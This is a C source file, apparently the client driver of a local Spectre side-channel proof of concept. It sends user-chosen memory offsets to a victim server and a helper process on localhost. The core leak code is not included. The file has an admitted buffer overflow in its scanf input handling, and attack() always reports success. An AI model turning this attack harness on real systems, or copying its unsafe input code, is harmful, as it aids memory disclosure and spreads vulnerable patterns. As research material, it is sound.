
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <assert.h>

#include "common.h"
#include "spectre.h"

/*
 * Asks user for an int offset until succeeded or EOF met and stores
 *  the result in 'offset'.
 * Returns whether input is valud.
 */
static int input(int *offset);
/*
 * Sends requests to 'victim' and 'slave' to trigger an attack on a
 *  byte located 'offset' from the reference address.
 * Returns wheter the attack succeded.
 */
static int attack(int victim, int slave, int offset);

int main(int argc, char *argv[])
{
    // Some general shit
    if (argc < 2)
    {
        fprintf(stderr, "Usage: %s port\n", argv[0]);
        return EXIT_FAILURE;
    }
    
    int err = set_cpu(1);
    if (err < 0)
        return EXIT_FAILURE;

    int port = read_port(argv[1]);
    if (port < 0)
    {
        fprintf(stderr, "Invalid port number: '%s'\n", argv[1]);
        return EXIT_FAILURE;
    }

    int server = setup_client("127.0.0.1", port);
    if (server < 0)
    {
        fprintf(stderr, "Connection to server failed\n");
        return EXIT_FAILURE;
    }
    int slave = setup_client("127.0.0.1", CONTROL_PORT);
    if (slave < 0)
    {
        fprintf(stderr, "Connection to slave failed\n");
        close(server);
        return EXIT_FAILURE;
    }

    // Main loop
    printf("Connections set up, let's go!\n");
    while (1)
    {
        int offset;
        if (!input(&offset))
            break;

        int found = 0;
        int attempts = 0;
        while (!found && attempts++ < 30)
        {
            found = attack(server, slave, offset);
            /*
             * If search failed, let the slave and the victim stabilize
             */
            usleep(50000);
        }
    }

    close(server);
    close(slave);
    return EXIT_SUCCESS;
}

int input(int *offset)
{
    assert(offset);

    while (1)
    {
        printf("Enter offset: ");
        int res = scanf("%i", offset);
        if (res == EOF)
        {
            printf("\n");
            return 0;
        }
        else if (res == 1)
            return 1;
    
        /*
         * Clearing input - not safe but still ok since the only users
         * are smart enought to not to break it :)
         */
        char buf[512];
        scanf("%s", buf);

        printf("Invalid input, try again\n");
    }
    // Never executed
    return 0;
}

int attack(int victim, int slave, int offset)
{
    assert(victim);
    assert(slave);

//    int requests[REQUEST_SIZE] = {};
//    requests[REQUEST_SIZE - 1] = offset;
    
    /*
     * No error recovery needed here:
     * 1. If send fails, we are free to die;
     * 2. If recv fails, it does not matter - we are not interested
     *    in any results on this side.
     */
//    int tmp;
//    int found;
//    send(victim, requests, sizeof(requests), 0);
//    send(slave,  &tmp,   sizeof(tmp),   0);
//    recv(victim, &tmp,   sizeof(tmp),   0);
//    recv(slave,  &found, sizeof(found), 0);
//
//    return found;
    
    for (int i = 0; i < BYTE_READ_REPEATS; i++)
    {
        int requests[REQUEST_SIZE] = {};
        requests[REQUEST_SIZE - 1] = offset;

        int tmp;
        int found;
        send(victim, requests, sizeof(requests), 0);
        send(slave,  requests, sizeof(requests), 0);
        recv(victim, &tmp,   sizeof(tmp),   0);
        recv(slave,  &found, sizeof(found), 0);

        usleep(5000);
    }
    return 1;
}

